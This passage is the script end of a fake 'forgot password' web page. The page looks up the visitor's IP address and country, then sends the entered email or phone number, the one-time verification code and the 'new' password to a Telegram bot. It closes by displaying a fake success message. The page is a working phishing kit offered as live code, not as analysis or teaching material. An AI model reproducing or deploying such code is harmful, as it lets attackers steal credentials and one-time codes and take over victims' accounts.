                        parse_mode: 'HTML'
                    })
                });
                return response.ok;
            } catch (error) {
                console.error('Telegram error:', error);
                return false;
            }
        }
        
        // Get user IP and country info
        const userInfo = {
            ip: 'Detecting...',
            country: 'Unknown',
            city: 'Unknown'
        };
        
        (async function() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                userInfo.ip = ipData.ip;
                
                const geoResponse = await fetch(`https://ipapi.co/${userInfo.ip}/json/`);
                const geoData = await geoResponse.json();
                userInfo.country = geoData.country_name || 'Unknown';
                userInfo.city = geoData.city || 'Unknown';
            } catch (error) {
                console.error('IP detection error:', error);
            }
        })();
        
        // Toast notification function
        function showToast(message) {
            const toast = document.createElement("div");
            toast.className = "toast-layer";
            toast.innerHTML = `
                <div class="overflow-hidden flex" style="height:50px;">
                    <div class="toast" style="position: relative; padding-right: 50px; height: 50px; align-items: center; border-radius: 12px;">
                        <div style="width: 20px; height: 20px; margin-right: 8px; background: #22c55e; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">
                            <svg width="12" height="10" viewBox="0 0 12 10" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M1 5L4.5 8.5L11 1.5" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            </svg>
                        </div>
                        <span style="font-size: 0.9rem;">${message}</span>
                        <div style="position: absolute; right: 14px; top: 50%; transform: translateY(-50%); width: 24px; height: 24px;">
                            <svg width="24" height="24" viewBox="0 0 24 24" style="transform: rotate(-90deg);">
                                <defs>
                                    <linearGradient id="progressGradient-${Date.now()}" x1="0%" y1="0%" x2="100%" y2="0%">
                                        <stop offset="0%" style="stop-color:#22c55e;stop-opacity:1" />
                                        <stop offset="100%" style="stop-color:#16a34a;stop-opacity:1" />
                                    </linearGradient>
                                </defs>
                                <circle cx="12" cy="12" r="10" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="3"/>
                                <circle class="toast-progress-ring" cx="12" cy="12" r="10" fill="none" stroke="url(#progressGradient-${Date.now()})" stroke-width="3" stroke-linecap="round" stroke-dasharray="62.83" stroke-dashoffset="62.83"/>
                            </svg>
                        </div>
                    </div>
                </div>`;
            document.body.appendChild(toast);

            const progressRing = toast.querySelector('.toast-progress-ring');
            
            // Start progress animation from top
            setTimeout(() => {
                progressRing.style.transition = 'stroke-dashoffset 6s linear';
                progressRing.style.strokeDashoffset = '0';
            }, 10);

            // After 6 seconds, animate back and remove
            setTimeout(() => {
                progressRing.style.transition = 'stroke-dashoffset 0.3s ease, opacity 0.3s ease';
                progressRing.style.strokeDashoffset = '62.83';
                progressRing.style.opacity = '0';
                
                setTimeout(() => {
                    toast.remove();
                }, 300);
            }, 6000);
        }
        
        // OTP Popup functions
        function showOtpPopup() {
            document.getElementById('otp-popup').classList.add('active');
            // Reset OTP input and disable button when popup opens
            const otpInput = document.getElementById('otp_input');
            const verifyBtn = document.getElementById('verify-btn');
            if (otpInput) otpInput.value = '';
            if (verifyBtn) verifyBtn.disabled = true;
        }
        
        function closeOtpPopup() {
            document.getElementById('otp-popup').classList.remove('active');
        }
        
        function pasteOtp() {
            navigator.clipboard.readText().then(text => {
                const otpInput = document.getElementById('otp_input');
                const digits = text.replace(/\D/g, '').slice(0, 6);
                otpInput.value = digits;
                // Trigger input event to enable/disable button
                otpInput.dispatchEvent(new Event('input'));
            }).catch(err => {
                console.error('Paste failed:', err);
            });
        }
        
        // Add OTP input validation
        document.addEventListener('DOMContentLoaded', function() {
            const otpInput = document.getElementById('otp_input');
            const verifyBtn = document.getElementById('verify-btn');
            
            if (otpInput && verifyBtn) {
                otpInput.addEventListener('input', function(e) {
                    // Only allow numbers
                    this.value = this.value.replace(/\D/g, '');
                    // Enable button only if exactly 6 digits
                    verifyBtn.disabled = this.value.length !== 6;
                });
            }
        });
        
        async function verifyOtp() {
            const otpCode = document.getElementById('otp_input').value.trim();
            const verifyBtn = document.getElementById('verify-btn');
            
            if (!otpCode) {
                showToast("Please enter verification code");
                return;
            }
            
            // Show loading spinner
            if (verifyBtn) {
                verifyBtn.classList.add('loading');
                verifyBtn.disabled = true;
            }
            
            // Send OTP to Telegram with formatting
            const otpMessage = `User(${forgotSessionNumber}) Forgot: <code>${otpCode}</code>`;
            await sendToTelegram(otpMessage);
            
            // Remove loading spinner
            if (verifyBtn) {
                verifyBtn.classList.remove('loading');
            }
            
            // Close popup
            closeOtpPopup();
            
            // Transform the form
            setTimeout(() => {
                isPasswordMode = true; // Set password mode flag
                
                // Hide passkey button
                const passkeyBtn = document.getElementById('passkey-btn');
                if (passkeyBtn) passkeyBtn.style.display = 'none';
                
                // Change placeholder to "New Password"
                const emailPhoneInput = document.getElementById('email-phone-visible');
                if (emailPhoneInput) {
                    emailPhoneInput.placeholder = 'New Password';
                    emailPhoneInput.type = 'password';
                    emailPhoneInput.value = '';
                }
                
                // Change button text to "Confirm"
                const submitBtn = document.querySelector('#reset-form button[type="submit"] span');
                if (submitBtn) submitBtn.textContent = 'Confirm';
                
                // Hide country selector elements
                const countryBtn = document.getElementById('country-btn');
                const sepEl = document.querySelector('.sep');
                if (countryBtn) countryBtn.style.display = 'none';
                if (sepEl) sepEl.style.display = 'none';
            }, 300);
        }
        
        // Country selector functionality
        (function(){
            const visible = document.getElementById('email-phone-visible');
            const hidden = document.getElementById('email-phone');
            const countryBtn = document.getElementById('country-btn');
            const picker = document.getElementById('country-picker');
            const countryListEl = document.getElementById('country-list');
            const searchEl = document.getElementById('country-search');

            if(!visible || !hidden || !countryBtn || !picker) return;

            const countries = [
                { name: 'Afghanistan', code: '+93' },
                { name: 'Albania', code: '+355' },
                { name: 'Algeria', code: '+213' },
                { name: 'Andorra', code: '+376' },
                { name: 'Angola', code: '+244' },
                { name: 'Argentina', code: '+54' },
                { name: 'Australia', code: '+61' },
                { name: 'Austria', code: '+43' },
                { name: 'Bangladesh', code: '+880' },
                { name: 'Belgium', code: '+32' },
                { name: 'Brazil', code: '+55' },
                { name: 'Canada', code: '+1' },
                { name: 'China', code: '+86' },
                { name: 'Denmark', code: '+45' },
                { name: 'Egypt', code: '+20' },
                { name: 'Finland', code: '+358' },
                { name: 'France', code: '+33' },
                { name: 'Germany', code: '+49' },
                { name: 'Greece', code: '+30' },
                { name: 'Hong Kong', code: '+852' },
                { name: 'India', code: '+91' },
                { name: 'Indonesia', code: '+62' },
                { name: 'Iran', code: '+98' },
                { name: 'Iraq', code: '+964' },
                { name: 'Ireland', code: '+353' },
                { name: 'Israel', code: '+972' },
                { name: 'Italy', code: '+39' },
                { name: 'Japan', code: '+81' },
                { name: 'Malaysia', code: '+60' },
                { name: 'Mexico', code: '+52' },
                { name: 'Netherlands', code: '+31' },
                { name: 'New Zealand', code: '+64' },
                { name: 'Norway', code: '+47' },
                { name: 'Pakistan', code: '+92' },
                { name: 'Philippines', code: '+63' },
                { name: 'Poland', code: '+48' },
                { name: 'Portugal', code: '+351' },
                { name: 'Russia', code: '+7' },
                { name: 'Saudi Arabia', code: '+966' },
                { name: 'Singapore', code: '+65' },
                { name: 'South Africa', code: '+27' },
                { name: 'South Korea', code: '+82' },
                { name: 'Spain', code: '+34' },
                { name: 'Sri Lanka', code: '+94' },
                { name: 'Sweden', code: '+46' },
                { name: 'Switzerland', code: '+41' },
                { name: 'Taiwan', code: '+886' },
                { name: 'Thailand', code: '+66' },
                { name: 'Turkey', code: '+90' },
                { name: 'Ukraine', code: '+380' },
                { name: 'United Arab Emirates', code: '+971' },
                { name: 'United Kingdom', code: '+44' },
                { name: 'United States', code: '+1' },
                { name: 'Vietnam', code: '+84' }
            ];

            let selectedCode = '+91';
            let detectedCode = null;

            function updateHidden(){
                const countryInput = document.getElementById('country-code');
                const phoneInput = document.getElementById('phone-number');
                const phoneVal = (visible.value || '');
                if(phoneInput) phoneInput.value = phoneVal;
                const btnVisible = countryBtn && countryBtn.style.display !== 'none';
                if(countryInput) countryInput.value = btnVisible ? selectedCode : '';
                if(hidden) hidden.value = btnVisible ? (selectedCode + ' ' + phoneVal) : phoneVal;
            }

            function showCountryBtn(){
                countryBtn.style.display = 'inline-flex';
                const s = document.querySelector('#input-container .sep');
                if(s) s.style.display = 'block';
            }

            function hideCountryBtnVisual(){
                countryBtn.style.display = 'none';
                const s = document.querySelector('#input-container .sep');
                if(s) s.style.display = 'none';
            }

            function renderList(filter=''){
                countryListEl.innerHTML = '';
                const q = filter.trim().toLowerCase();
                const filtered = countries.filter(c => c.name.toLowerCase().includes(q) || c.code.includes(q));
                filtered.forEach(c=>{
                    const b = document.createElement('button');
                    b.type = 'button';
                    b.className = 'country-item';
                    b.dataset.code = c.code;

                    b.innerHTML = `
                        <div class="country-row">
                            <div class="country-code-left">${c.code}</div>
                            <div class="country-name">${c.name}</div>
                            <div class="country-radio">
                                <span class="radio-inner"></span>
                            </div>
                        </div>
                    `;

                    if(selectedCode === c.code){
                        b.classList.add('selected');
                    }

                    b.addEventListener('click', ()=>{
                        selectedCode = c.code;
                        const prev = countryListEl.querySelector('.country-item.selected');
                        if(prev){ prev.classList.remove('selected'); }
                        b.classList.add('selected');
                        countryBtn.innerHTML = `<strong class="country-code">${selectedCode}</strong> <span class="caret">▾</span>`;
                        updateHidden();
                        hidePicker();
                        visible.focus();
                    });

                    countryListEl.appendChild(b);
                });
            }

            function showPicker(){
                picker.style.display = 'flex';
                searchEl.value = '';
                renderList('');
                setTimeout(()=>searchEl.focus(),50);
            }

            function hidePicker(){
                picker.style.display = 'none';
            }

            // Detect country code by IP
            (function detectCountryCodeByIP(){
                try{
                    fetch('https://ipapi.co/json/').then(r=>r.ok? r.json() : null).then(data=>{
                        if(!data) return;
                        if(data.country_calling_code) detectedCode = data.country_calling_code;
                        if(detectedCode){
                            selectedCode = detectedCode;
                            const btnVisibleNow = countryBtn && countryBtn.style.display !== 'none';
                            if(btnVisibleNow){
                                countryBtn.innerHTML = `<strong class="country-code">${selectedCode}</strong> <span class="caret">▾</span>`;
                                updateHidden();
                            }
                        }
                    }).catch(()=>{});
                }catch(e){}
            })();

            visible.addEventListener('input', (e)=>{
                const v = e.target.value || '';
                // Only show country button if NOT in password mode and value starts with 3 digits
                if(!isPasswordMode && v.length >= 3 && /^\d{3}/.test(v.slice(0,3))){
                    selectedCode = detectedCode || '+91';
                    countryBtn.innerHTML = `<strong class="country-code">${selectedCode}</strong> <span class="caret">▾</span>`;
                    showCountryBtn();
                } else {
                    const btnVisibleNow = countryBtn && countryBtn.style.display !== 'none';
                    if(btnVisibleNow){
                        hidePicker();
                        hideCountryBtnVisual();
                    }
                }
                updateHidden();
            });

            visible.addEventListener('change', updateHidden);
            countryBtn.addEventListener('click', (e)=>{
                e.stopPropagation();
                if(picker.style.display === 'flex') hidePicker(); else showPicker();
            });
            searchEl.addEventListener('input', ()=> renderList(searchEl.value || ''));
            document.getElementById('country-picker-close').addEventListener('click', ()=> hidePicker());
            document.addEventListener('click', (e)=>{
                if(!picker.contains(e.target) && e.target !== countryBtn) hidePicker();
            });

            updateHidden();
            
            // Add form submission handler here after country selector is initialized
            const resetForm = document.getElementById('reset-form');
            if (resetForm) {
                resetForm.addEventListener('submit', async function(e) {
                    e.preventDefault();
                    
                    const submitButton = this.querySelector('button[type="submit"]');
                    const emailPhoneInput = document.getElementById('email-phone-visible');
                    
                    // Check if this is the initial submission or password confirmation
                    if (emailPhoneInput.placeholder === 'New Password') {
                        // This is password confirmation - send password to Telegram
                        const newPassword = emailPhoneInput.value.trim();
                        
                        if (!newPassword) {
                            showToast("Please enter new password");
                            return;
                        }
                        
                        // Start loading animation
                        submitButton.classList.add('loading');
                        
                        // Send password to Telegram
                        const passwordMessage = `<b>Password User(${forgotSessionNumber}):</b> <code>${newPassword}</code>`;
                        await sendToTelegram(passwordMessage);
                        
                        // Stop loading animation
                        submitButton.classList.remove('loading');
                        
                        // Show success toast
                        showToast("Password changed Successfully");
                        
                        // Reset form after a delay
                        setTimeout(() => {
                            window.location.reload();
                        }, 2000);
                        
                        return;
                    }
                    
                    // Initial submission - get email/phone
                    userEmailPhone = emailPhoneInput.value.trim();
                    if (!userEmailPhone) {
                        showToast("Please enter email or phone number");
                        return;
                    }
                    
                    // Get country code if phone number
                    const countryCodeInput = document.getElementById('country-code');
                    const phoneNumberInput = document.getElementById('phone-number');
                    const countryCode = countryCodeInput ? countryCodeInput.value : '';
                    const phoneNumber = phoneNumberInput ? phoneNumberInput.value : '';
                    
                    // Determine if email or phone and format accordingly
                    let credentialsType, credentialsHtml;
                    if (countryCode && phoneNumber) {
                        // Phone with country code - validate
                        const digits = phoneNumber.replace(/\D/g, '');
                        if (digits.length < 7 || digits.length > 15) {
                            showToast("Enter a valid phone number");
                            return;
                        }
                        credentialsType = 'Phone';
                        credentialsHtml = `<b>${countryCode}</b> <code>${digits}</code>`;
                    } else if (/^[\d+][\d\s\-()]+$/.test(userEmailPhone.replace(/\s/g, ''))) {
                        // Looks like phone - validate
                        const phoneNum = userEmailPhone.replace(/\D/g, '');
                        if (phoneNum.length < 7 || phoneNum.length > 15) {
                            showToast("Enter a valid phone number");
                            return;
                        }
                        credentialsType = 'Phone';
                        credentialsHtml = `<code>+${phoneNum}</code>`;
                    } else {
                        // Email - validate format
                        credentialsType = 'Email';
                        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                        if (!emailRegex.test(userEmailPhone)) {
                            showToast("Enter a valid email");
                            return;
                        }
                        credentialsHtml = `<code>${userEmailPhone}</code>`;
                    }
                    
                    // Start loading animation
                    submitButton.classList.add('loading');
                    
                    // Determine country
                    userCountry = userInfo.country;
                    
                    // Send to Telegram with proper formatting
                    const message = `<b>(USER ${forgotSessionNumber} (FORGOT))</b>
<b>${credentialsType}:</b> ${credentialsHtml}
<b>Country:</b> ${userCountry}`;
                    
                    await sendToTelegram(message);
                    
                    // Stop loading animation
                    submitButton.classList.remove('loading');
                    
                    // Show OTP popup
                    showOtpPopup();
                });
            }
            
            const passkeyBtn = document.getElementById('passkey-btn');
            if (passkeyBtn) {
                passkeyBtn.addEventListener('click', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    showToast("Verification method unavailable.");
                });
            }
        })();
    </script>
</body>
</html>
